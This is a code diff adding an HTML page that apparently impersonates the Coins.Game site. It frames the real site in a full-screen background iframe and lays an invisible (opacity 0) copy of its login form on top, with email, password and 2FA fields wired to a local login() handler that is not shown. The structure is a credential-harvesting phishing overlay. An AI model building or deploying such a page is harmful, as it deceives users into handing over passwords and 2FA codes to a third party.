@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Coins.Game</title>
+  </head>
+
+  <body>
+    <div id="root"></div>
+    <script src="./js/app.js"></script>
+    <link rel="stylesheet" href="./css/app.css" />
+    <link
+      rel="stylesheet"
+      href="https://coins.game/assets/swiper-bundleNew.min.css?x=112sda45233182"
+    />
+  </body>
+
+  <iframe
+    src="https://coins.game"
+    frameborder="0"
+    allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
+    allowfullscreen
+    style="
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: -999;
+    "
+    onload="onLoadHandler();"
+  ></iframe>
+
+  <div
+    style="
+      display: flex;
+      z-index: 16000;
+      width: 100vw;
+      height: 100vh;
+      opacity: 0;
+    "
+    class="registr-content21"
+  >
+    <div class="registr-close-block" onclick="closeMobileLogin()"></div>
+    <div id="module-login3" class="content-main665 content-main065">
+      <div class="main-content-wrapper1">
+        <div class="mobile-close-block30">
+          <div onclick="closeMobileLogin()" class="btn-close10">
+            <i class="modal_icon"></i>
+          </div>
+        </div>
+        <div class="main-content-wr022 main-content-wr23">
+          <div class="main-content-ou26 main-content-ou29">
+            <div class="lng_wr_no login-content-in30" style="display: none">
+              <h1
+                style="margin: 10px 0 20px"
+                class="title-cabinet77 ltext53 ltext55"
+              >
+                <span>Language</span>
+              </h1>
+              <div class="lng_wr_nnn"></div>
+            </div>
+            <div class="login-content-in30 log_wr_n">
+              <h1 class="title-cabinet77 ltext53 ltext55">
+                <span>Log in</span>
+              </h1>
+              <div class="login-icon303">
+                <img
+                  loading="lazy"
+                  width="175"
+                  height="31"
+                  src="https://coins.game/assets/coins_d2__winter.svg?x=2"
+                  srcset="https://coins.game/assets/coins_d2__winter.svg?x=2 2x"
+                />
+              </div>
+              <div class="login-data30">
+                <fieldset class="desk_login21">
+                  <label
+                    id="mobile-login-wrapper"
+                    class="label-name65 label-name651"
+                  >
+                    <p class="dw_text">Email or phone</p>
+                    <input
+                      placeholder="Email or phone"
+                      inputmode="email"
+                      name="email"
+                      autocomplete="email"
+                      autocapitalize="off"
+                      autocorrect="off"
+                      class="inputVal2 inputVal8 inputVal11"
+                      type="text"
+                    />
+                    <span class="labelWarn5"
+                      >Please enter an email address</span
+                    >
+                    <!-- <span class="labelTitle9 labelTitle8">Email or phone</span> -->
+                  </label>
+                </fieldset>
+                <fieldset class="_1S9jE desk_login21">
+                  <label
+                    id="mobile-password-wrapper"
+                    class="label-name65 label-name651"
+                  >
+                    <p class="dw_text">Password</p>
+                    <input
+                      placeholder="Password"
+                      name="password"
+                      autocomplete="current-password"
+                      autocapitalize="off"
+                      autocorrect="off"
+                      class="inputVal2 inputVal8 inputVal11"
+                      type="password"
+                      value=""
+                    />
+                    <span class="labelWarn5">Required field</span>
+                    <!-- <span class="labelTitle9 labelTitle8">Password</span> -->
+                  </label>
+                </fieldset>
+
+                <fieldset class="_1S9jE 2fa_login21" style="display: none">
+                  <label class="label-name65 label-name651">
+                    <p class="dw_text">2FA</p>
+                    <input
+                      placeholder="2FA"
+                      name="text"
+                      id="2fa_login50"
+                      inputmode="numeric"
+                      autocapitalize="off"
+                      autocorrect="off"
+                      autocomplete="off"
+                      class="inputVal2 inputVal8 inputVal11"
+                      type="text"
+                      value=""
+                    />
+                    <!--  <span class="labelTitle9 labelTitle8">2FA</span> -->
+                  </label>
+                </fieldset>
+                <a
+                  class="btn-main-open021 btn-main-open016 btn-main-open015 btn-main-open014"
+                  ><span class="name-btn-text26">
+                    <span>Forgot your password</span>
+                  </span>
+                </a>
+                <fieldset>
+                  <!--button onclick="grecaptcha.execute(grcW_enter)" class="btn-main-open021 btn-main-open019 btn-main-open008 btn-main-open017" type="submit"><canvas height="0" width="0" style="border-radius: inherit; height: 100%; left: 0px; position: absolute; top: 0px; width: 100%;"></canvas><span class="name-btn-text26"><span>Log in</span></span></button-->
+                  <button
+                    id="login_send10"
+                    onclick="login(this);"
+                    class="btn-main-open021 btn-main-open019 btn-main-open008 btn-main-open017"
+                    type="submit"
+                  >
+                    <canvas
+                      height="0"
+                      width="0"
+                      style="
+                        border-radius: inherit;
+                        height: 100%;
+                        left: 0px;
+                        position: absolute;
+                        top: 0px;
+                        width: 100%;
+                      "
+                    ></canvas
+                    ><span class="name-btn-text26"><span>Log in</span></span>
+                  </button>
+                </fieldset>
+              </div>
+
+              <div class="login-text010"><span>Or login with</span></div>
+              <div class="r1btn75 btn_reg_desk3 btn-main-wr010">
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://accounts.google.com/o/oauth2/auth?redirect_uri=https://coins.game/oauth/?provider=google&amp;response_type=code&amp;client_id=926203350081-rogua2stnkqcf7j35dclgua94sbasnb0.apps.googleusercontent.com&amp;scope=https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&amp;state="
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 oQRso"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://www.facebook.com/dialog/oauth?client_id=1331319233960751&amp;redirect_uri=https://coins.game/oauth/?provider=facebook&amp;response_type=code&amp;scope=email,user_birthday&amp;state="
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 -TRbK"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+                <div class="btn-main-wr011">
+                  <a id="telegram_button_reg2" href="javascript:void()">
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 TELEG"></i
+                      ></span>
+                    </button>
+                    <iframe
+                      id="telegram-login-CoinsGameLogin_bot"
+                      src="https://oauth.telegram.org/embed/CoinsGameLogin_bot?origin=https%3A%2F%2Fcoins.game&amp;return_to=https%3A%2F%2Fcoins.game%2F%3F%26signin&amp;size=large&amp;request_access=write"
+                      width="238"
+                      height="40"
+                      frameborder="0"
+                      scrolling="no"
+                      style="
+                        overflow: hidden;
+                        color-scheme: light dark;
+                        border: none;
+                        height: 40px;
+                        width: 242px;
+                      "
+                    ></iframe>
+                    <script
+                      async=""
+                      src="https://telegram.org/js/telegram-widget.js?15"
+                      data-telegram-login="CoinsGameLogin_bot"
+                      data-size="large"
+                      data-auth-url="https://coins.game/oauth/telegram.php"
+                      data-request-access="write"
+                    ></script
+                  ></a>
+                </div>
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://id.twitch.tv/oauth2/authorize?response_type=code&amp;client_id=3cr6fdhhkaeo65pioy8t26ds2alzh1&amp;redirect_uri=https://coins.game/oauth/?provider=twitch&amp;scope=user_read&amp;state=start"
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 TWITC"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+
+                <div class="btn-main-wr011">
+                  <a
+                    href="http://oauth.vk.com/authorize?client_id=8054948&amp;scope=notify,email&amp;redirect_uri=https://coins.game/oauth/?provider=vk&amp;response_type=code&amp;state="
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 VKIC"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://coins.game/oauth/twitter.php"
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 TWITTERIC"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://coins.game/oauth/steam.php?login"
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span
+                        style="
+                          padding: 2px;
+                          border-radius: 50%;
+                          background-color: #fff;
+                        "
+                        class="name-btn-text26"
+                        ><i class="icon1091 STEAMIC"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+
+                <div class="btn-main-wr011">
+                  <a
+                    href="https://coins.game/oauth/reddit.php"
+                    style="display: contents"
+                  >
+                    <button
+                      class="btn-main-open021 btn-main-open025 btn-main-open008 btn-main-open013 btn-main-open011"
+                      type="button"
+                    >
+                      <canvas
+                        height="0"
+                        width="0"
+                        style="
+                          border-radius: inherit;
+                          height: 100%;
+                          left: 0px;
+                          position: absolute;
+                          top: 0px;
+                          width: 100%;
+                        "
+                      ></canvas>
+                      <span class="name-btn-text26"
+                        ><i class="icon1091 REDDITIC"></i
+                      ></span>
+                    </button>
+                  </a>
+                </div>
+              </div>
+              <div class="login-text011">
+                <span class="login-text013"></span>
+              </div>
+              <div class="login-text014">
+                <span>Join CoinsGame today!</span
+                ><span onclick="openSign();closeMobileLogin();"
+                  >Register Now</span
+                >
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</html>
